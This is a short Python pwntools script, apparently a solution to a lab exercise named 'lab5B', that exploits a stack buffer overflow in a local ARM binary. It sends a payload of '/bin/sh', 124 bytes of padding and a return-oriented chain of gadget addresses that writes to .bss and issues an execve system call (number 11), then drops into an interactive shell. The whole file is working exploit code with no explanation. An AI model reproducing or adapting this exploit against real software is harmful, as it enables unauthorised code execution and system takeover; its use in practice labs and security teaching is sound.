#!/usr/bin/env python

from pwn import *

r = process(['./lab5B'])
print util.proc.pidof(r)
pause()

payload = "/bin/sh\x00"
payload += "A" * 124
payload += p32(0x00025c7c)	# pop {r0, r4, pc}
payload += p32(0x76ffb000)	# '/bin/sh'
payload += p32(0)
payload += p32(0x0006dfbc)	# : pop {r1, pc}
payload += p32(0x98890)		# .bss
payload += p32(0x0004e01c)	# : str r0, [r1] ; bhi #0x4e038 ; mov r0, #0 ; pop {r7, pc}
payload += p32(11)
payload += p32(0x00025c7c)      # pop {r0, r4, pc}
payload += p32(0x76ffb000)      # '/bin/sh'
payload += p32(0)
payload += p32(0x00010140)	# : pop {r3, pc}
payload += p32(0x988b0)
payload += p32(0x00062174)	# : add r2, r3, #4 ; str r2, [r3] ; pop {r3, pc}
payload += p32(0)
payload += p32(0x000635c8)	#svc #0 ; cmn r0, #0x1000 ; mov r3, r0 ; bhi #0x635ec ; pop {r7, pc}

r.sendline(payload)
r.clean()
r.interactive()
